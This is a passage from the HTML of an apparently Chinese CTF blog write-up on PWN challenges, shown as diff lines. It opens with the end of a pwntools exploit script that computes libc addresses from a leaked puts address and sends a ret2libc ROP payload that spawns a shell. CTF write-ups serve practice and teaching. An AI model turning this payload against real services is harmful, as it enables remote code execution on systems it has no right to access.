class="comment"># libc</span></span><br><span class="line">base_addr = puts_addr - lib.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = base_addr + lib.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = base_addr + <span class="built_in">next</span>(lib.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">one_gadget_addr = <span class="number">0x45216</span> + base_addr</span><br><span class="line"><span class="comment"># obj = LibcSearcher(&quot;puts&quot;, puts_addr)</span></span><br><span class="line"><span class="comment"># base_addr = puts_addr &gt;&gt; 24</span></span><br><span class="line"><span class="comment"># base_addr = base_addr &lt;&lt; 24</span></span><br><span class="line"><span class="comment"># system_addr = base_addr+ obj.dump(&quot;system&quot;)       #system 偏移</span></span><br><span class="line"><span class="comment"># bin_sh_addr = base_addr+ obj.dump(&quot;str_bin_sh&quot;)   #/bin/sh 偏移</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line">payload2 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;M&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>-<span class="number">1</span>)  + p64(rdi_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>m0sway</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2022/01/22/nynusec%E5%B9%B3%E5%8F%B0%E5%85%A8WriteUp(PWN)/">http://example.com/2022/01/22/nynusec%E5%B9%B3%E5%8F%B0%E5%85%A8WriteUp(PWN)/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/PWN/"># PWN</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2022/02/17/Mysql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/">Mysql注入备忘录</a>
+            
+            
+            <a class="next" rel="next" href="/2022/01/18/Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">Linux信息收集</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© m0sway
+    </div>
+    
+        <!-- 统计 -->
+        <span id="busuanzi_container_site_pv">
+                访问量: <span id="busuanzi_value_site_pv"></span>
+        </span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv" style='display:none'>
+                访客: <span id="busuanzi_value_site_uv"></span>
+        </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+</footer>
+
+    </div>
+</body>
+
+</html>
